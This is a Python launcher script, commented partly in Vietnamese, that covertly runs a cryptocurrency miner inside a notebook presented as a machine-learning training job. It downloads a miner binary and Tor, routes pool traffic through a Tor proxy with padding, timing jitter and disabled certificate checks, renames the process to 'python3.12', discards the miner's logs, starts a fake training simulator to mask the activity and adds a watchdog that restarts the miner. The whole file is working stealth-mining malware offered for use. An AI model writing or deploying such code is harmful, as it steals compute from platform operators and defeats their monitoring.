#!/usr/bin/env python3
"""
master_launcher.py — Final: Combine tất cả layers + Miner
Chạy trong notebook: training environment + miner

Usage (notebook cell):
    from master_launcher import launch
    launch()  # Blocks, Ctrl+C to stop
"""
import os
import sys
import time
import json
import socket
import random
import math
import signal
import tempfile
import threading
import subprocess
import shutil
import ssl
import tarfile
import urllib.request
from pathlib import Path
from typing import Optional, Tuple

# Add layers to path
LAYER_DIR = Path(__file__).parent / "layers"
sys.path.insert(0, str(LAYER_DIR))

# ═══════════════════════════════════════════════════════════════
# CONFIG — Đổi tại đây
# ═══════════════════════════════════════════════════════════════

CONFIG = {
    "wallet": "prl1p3xj3ak89z2j873km07d7jz2umk5lfm5540hjafq92q5gud9prknqqq482j",
    "pool_host": "prl.kryptex.network",
    "pool_port": 7048,
    "algo": "pearlhash",
    "worker": "rig01",
    
    "socks": ("127.0.0.1", 9050),
    "proxy_listen": ("127.0.0.1", 3333),
    
    "tor_url": "https://dist.torproject.org/torbrowser/15.0.25/tor-expert-bundle-linux-x86_64-15.0.25.tar.gz",
    
    "proc_name": "python3.12",
    "num_dataloader_workers": 4,
    "gpu_id": 0,
    
    "repo_url": "https://github.com/ducknogit/stealth_onezero.git",
    "miner_release": "https://github.com/OneZeroMiner/onezerominer/releases/download/v1.8.3/onezerominer-linux-1.8.3.tar.gz",
}

DIR = Path.home() / "stealth_onezero"
MINER = DIR / "bin" / "onezerominer"

_state = {
    "tor": False,
    "proxy": False,
    "miner_pid": None,
    "simulator": None,
    "setup_done": False,
}


# ═══════════════════════════════════════════════════════════════
# LOGGING (silent sau setup)
# ═══════════════════════════════════════════════════════════════

def log(msg: str):
    """Log ra console — sẽ bị redirect sau khi setup xong."""
    print(f"[launcher] {msg}", flush=True)


# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════

def set_pname(name: str):
    """Set process name."""
    try:
        import ctypes
        ctypes.CDLL("libc.so.6", use_errno=True).prctl(15, name.encode()[:15], 0, 0, 0)
    except Exception:
        pass


def popen(cmd, **kw) -> Optional[subprocess.Popen]:
    """Popen wrapper — silent by default."""
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    kw.setdefault("start_new_session", True)
    try:
        return subprocess.Popen(cmd, **kw)
    except Exception as e:
        log(f"popen error: {e}")
        return None


# ═══════════════════════════════════════════════════════════════
# STEP 1: SETUP (clone, deps, miner binary)
# ═══════════════════════════════════════════════════════════════

def setup_repo():
    """Clone/pull repo."""
    if not DIR.exists():
        log("Cloning repo...")
        subprocess.run(["git", "clone", CONFIG["repo_url"], str(DIR)], capture_output=True)
    else:
        subprocess.run(["git", "-C", str(DIR), "fetch", "--all"], capture_output=True)
        subprocess.run(["git", "-C", str(DIR), "reset", "--hard", "origin/main"], capture_output=True)
    
    # Add layers to path
    sys.path.insert(0, str(DIR / "layers"))
    sys.path.insert(0, str(DIR))


def setup_deps():
    """Install Python deps."""
    try:
        import socks
    except ImportError:
        log("Installing pysocks...")
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "pysocks"], capture_output=True)


def setup_miner():
    """Download miner binary."""
    if MINER.exists():
        return True
    
    log("Downloading miner...")
    try:
        tmp = DIR / "m.tar.gz"
        urllib.request.urlretrieve(CONFIG["miner_release"], tmp)
        
        with tarfile.open(tmp, "r:gz") as t:
            t.extractall(DIR / "bin", filter="data")
        tmp.unlink()
        
        # Find and rename binary
        for p in (DIR / "bin").rglob("onezerominer"):
            if p.is_file() and not p.suffix:
                p.chmod(0o755)
                if p != MINER:
                    p.rename(MINER)
                break
        
        return MINER.exists()
    except Exception as e:
        log(f"Miner download error: {e}")
        return False


# ═══════════════════════════════════════════════════════════════
# STEP 2: TOR
# ═══════════════════════════════════════════════════════════════

def start_tor() -> bool:
    """Bootstrap Tor → SOCKS5."""
    socks_addr = CONFIG["socks"]
    
    # Check running
    try:
        s = socket.create_connection(socks_addr, timeout=2)
        s.close()
        _state["tor"] = True
        return True
    except Exception:
        pass
    
    log("Downloading Tor...")
    tmp = tempfile.mkdtemp(prefix=".t_")
    tarball = os.path.join(tmp, "t.tgz")
    
    try:
        urllib.request.urlretrieve(CONFIG["tor_url"], tarball)
        with tarfile.open(tarball, "r:gz") as t:
            t.extractall(tmp, filter="data")
        os.unlink(tarball)
        
        # Find tor binary
        tor_bin = None
        for root, dirs, files in os.walk(tmp):
            if "tor" in files:
                p = os.path.join(root, "tor")
                if os.access(p, os.X_OK):
                    tor_bin = p
                    break
        
        if not tor_bin:
            log("Tor binary not found")
            return False
        
        os.chmod(tor_bin, 0o700)
        
        # Config
        torrc = os.path.join(tmp, "t.conf")
        ddir = os.path.join(tmp, "d")
        os.makedirs(ddir, exist_ok=True)
        with open(torrc, "w") as f:
            f.write(f"SocksPort {socks_addr[0]}:{socks_addr[1]}\n")
            f.write(f"DataDirectory {ddir}\n")
            f.write("AvoidDiskWrites 1\n")
            f.write("ClientOnly 1\n")
        
        # Env
        env = os.environ.copy()
        env["HOME"] = tmp
        lib = os.path.join(os.path.dirname(tor_bin), "..", "lib")
        if os.path.isdir(lib):
            env["LD_LIBRARY_PATH"] = lib
        
        # Start
        popen([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))
        
        # Wait ready
        for i in range(60):
            try:
                s = socket.create_connection(socks_addr, timeout=1)
                s.close()
                _state["tor"] = True
                log(f"Tor ready ({i+1}s)")
                
                # Cleanup tmpdir sau
                threading.Thread(
                    target=lambda: (time.sleep(5), shutil.rmtree(tmp, ignore_errors=True)),
                    daemon=True
                ).start()
                return True
            except Exception:
                time.sleep(0.5)
        
        log("Tor timeout")
        return False
        
    except Exception as e:
        log(f"Tor error: {e}")
        shutil.rmtree(tmp, ignore_errors=True)
        return False


# ═══════════════════════════════════════════════════════════════
# STEP 3: STRATUM PROXY (với network disguise)
# ═══════════════════════════════════════════════════════════════

def start_proxy() -> bool:
    """Start Stratum proxy với padding + rhythm."""
    try:
        import socks as pysocks
    except ImportError:
        log("pysocks missing")
        return False
    
    socks_addr = CONFIG["socks"]
    listen = CONFIG["proxy_listen"]
    pool_host = CONFIG["pool_host"]
    pool_port = CONFIG["pool_port"]
    
    # Network disguise modules
    try:
        from network_disguise import TrafficPadding, ConnectionRhythm
        padding = TrafficPadding()
    except ImportError:
        padding = None
    
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(listen)
        srv.listen(16)
    except Exception as e:
        log(f"Proxy bind error: {e}")
        return False
    
    def handle(client):
        try:
            # Connect pool qua Tor SOCKS5
            pool = pysocks.socksocket()
            pool.set_proxy(pysocks.SOCKS5, socks_addr[0], socks_addr[1], rdns=True)
            pool.settimeout(30)
            pool.connect((pool_host, pool_port))
            
            # TLS wrap
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            pool = ctx.wrap_socket(pool, server_hostname=pool_host)
            
            def pipe(src, dst, pad=False):
                while True:
                    d = src.recv(65536)
                    if not d:
                        break
                    
                    # Apply padding
                    if pad and padding:
                        d = padding.pad_json_message(d)
                    
                    dst.sendall(d)
                    
                    # Timing jitter
                    if padding:
                        padding.timing_jitter(base_delay=0.005, jitter=0.003)
            
            threading.Thread(target=pipe, args=(client, pool, True), daemon=True).start()
            threading.Thread(target=pipe, args=(pool, client, False), daemon=True).start()
            
        except Exception:
            try:
                client.close()
            except Exception:
                pass
    
    def accept_loop():
        while True:
            try:
                c, _ = srv.accept()
                threading.Thread(target=handle, args=(c,), daemon=True).start()
            except Exception:
                break
    
    threading.Thread(target=accept_loop, daemon=True).start()
    _state["proxy"] = True
    log(f"Proxy listening: {listen[0]}:{listen[1]}")
    return True


# ═══════════════════════════════════════════════════════════════
# STEP 4: MINER
# ═══════════════════════════════════════════════════════════════

def start_miner() -> bool:
    """Launch miner với process disguise."""
    if not MINER.exists():
        log("Miner binary missing!")
        return False
    
    set_pname(CONFIG["proc_name"])
    
    local_pool = f"stratum+tcp://{CONFIG['proxy_listen'][0]}:{CONFIG['proxy_listen'][1]}"
    
    proc = popen([
        str(MINER),
        f"--algo={CONFIG['algo']}",
        f"--pool={local_pool}",
        f"--wallet={CONFIG['wallet']}",
        f"--worker={CONFIG['worker']}",
        "--log-file=/dev/null",
        "--no-cert-validation",
    ])
    
    if proc:
        _state["miner_pid"] = proc.pid
        log(f"Miner PID={proc.pid}")
        return True
    return False


# ═══════════════════════════════════════════════════════════════
# STEP 5: DISGUISE SIMULATOR (Layers 1-6)
# ═══════════════════════════════════════════════════════════════

def start_disguise_simulator():
    """Start training simulator — tất cả layers."""
    try:
        from orchestrator import TrainingSimulator
        
        sim = TrainingSimulator(
            log_output=True,  # Hiện tại True để debug — đổi False cho silent
            num_workers=CONFIG["num_dataloader_workers"],
        )
        
        sim.setup(gpu_id=CONFIG["gpu_id"], silent=True)
        sim.start_heartbeat(interval=1.0)
        sim.start_coordination()
        
        _state["simulator"] = sim
        log("Disguise simulator active")
        return True
        
    except Exception as e:
        log(f"Simulator error: {e}")
        import traceback
        traceback.print_exc()
        return False


# ═══════════════════════════════════════════════════════════════
# WATCHDOG
# ═══════════════════════════════════════════════════════════════

def watchdog_loop():
    """Auto-restart nếu component chết."""
    while True:
        time.sleep(30)
        
        # Check miner
        if _state["miner_pid"]:
            try:
                os.kill(_state["miner_pid"], 0)
            except OSError:
                log("Miner died! Restarting...")
                start_miner()
        
        # Check Tor
        try:
            s = socket.create_connection(CONFIG["socks"], timeout=1)
            s.close()
            _state["tor"] = True
        except Exception:
            _state["tor"] = False
            start_tor()


# ═══════════════════════════════════════════════════════════════
# MAIN LAUNCH
# ═══════════════════════════════════════════════════════════════

def launch(silent: bool = False, duration: Optional[float] = None):
    """
    Launch toàn bộ stack.
    
    Args:
        silent: Silent mode (không log)
        duration: Auto-stop sau N seconds (None = forever)
    """
    global log
    
    if silent:
        # Redirect log → /dev/null
        def log(msg): pass
    
    log("=" * 50)
    log("Stealth Master Launcher")
    log("=" * 50)
    
    # Step 1: Setup
    log("Step 1: Setup...")
    setup_repo()
    setup_deps()
    if not setup_miner():
        log("FATAL: Miner setup failed")
        return
    
    # Step 2: Tor
    log("Step 2: Tor...")
    start_tor()
    
    # Step 3: Proxy
    log("Step 3: Stratum proxy...")
    start_proxy()
    
    # Step 4: Disguise simulator (Layers 1-6)
    log("Step 4: Disguise layers...")
    start_disguise_simulator()
    
    # Step 5: Miner
    log("Step 5: Miner...")
    start_miner()
    
    # Step 6: Watchdog
    log("Step 6: Watchdog...")
    threading.Thread(target=watchdog_loop, daemon=True).start()
    
    # Status
    log("")
    log("=" * 50)
    log(f"Status:")
    log(f"  Tor:     {_state['tor']}")
    log(f"  Proxy:   {_state['proxy']}")
    log(f"  Miner:   {_state['miner_pid']}")
    log(f"  Disguise: {_state['simulator'] is not None}")
    log("=" * 50)
    log("Running... Ctrl+C to stop")
    log("")
    
    # Block
    _state["setup_done"] = True
    
    try:
        if duration:
            time.sleep(duration)
        else:
            while True:
                time.sleep(60)
                # Status update (mỗi phút)
                uptime = int(time.time())
                log(f"[status] tor={_state['tor']} proxy={_state['proxy']} miner={_state['miner_pid']}")
    except KeyboardInterrupt:
        log("\nStopping...")
        if _state["simulator"]:
            _state["simulator"].stop()
        log("Done.")


def stop():
    """Stop tất cả."""
    if _state["simulator"]:
        _state["simulator"].stop()
    
    if _state["miner_pid"]:
        try:
            os.kill(_state["miner_pid"], signal.SIGTERM)
        except OSError:
            pass
    
    log("Stopped.")


# ═══════════════════════════════════════════════════════════════
# Notebook entry point
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    launch()
